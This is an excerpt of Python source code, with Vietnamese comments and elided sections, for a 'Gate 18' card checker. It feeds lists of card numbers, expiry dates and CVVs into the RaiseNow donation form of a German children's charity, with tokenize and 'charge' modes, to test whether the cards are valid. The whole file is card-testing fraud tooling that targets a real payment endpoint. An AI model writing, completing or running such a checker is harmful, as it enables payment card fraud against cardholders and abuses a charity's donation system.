...
# --- LOGIC CHÍNH CỦA GATE 18 ---

def check_card_gate18(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate18_mode, get_charge_value_func, custom_charge_amount=None):
    """
    Logic for Gate 18 - Dựa trên formId và payload bạn cung cấp.
    """
    gate18_mode = get_gate18_mode()
    ...
    try:
        ...
        tokenize_payload = {
            "mode": "TOKENIZE",
            "formId": "250809171314228987", # formId bạn cung cấp
            "cardNumber": cc,
            "cvv": cvv,
            "paymentMethod": "ECA",
        ...
        base_payload = {
            ...
            "raisenow_parameters": {
                ...
                "solution": {
                    "uuid": "fc42c2dd-c128-4f9e-bc99-fb0bbda90355",
                    "name": "Spenden Sie für hilfsbedürftige Kinder in Deutschland",
                    "type": "donate"
                },
                "product": {
                    "name": "tamaro",
                    "source_url": "https://donate.raisenow.io/rznkh?lng=de",
                    "uuid": "self-service",
                    "version": "2.16.0"
                },
                "integration": {
            ...
            "custom_parameters": {
                "campaign_id": "Spenden Sie für hilfsbedürftige Kinder in Deutschland",
                "campaign_subid": ""
            },
            "payment_information": {
                "brand_code": "eca",
        ...
        # --- CHẾ ĐỘ CHARGE ---
        if gate18_mode == 'charge':
            charge_value = get_charge_value_func('18', custom_charge_amount)
        ...
        logger.error(f"Unknown error in Gate 18 for line '{line}': {e}", exc_info=True)
        return 'error', line, f"Gate 18 System Error: {e}", bin_info
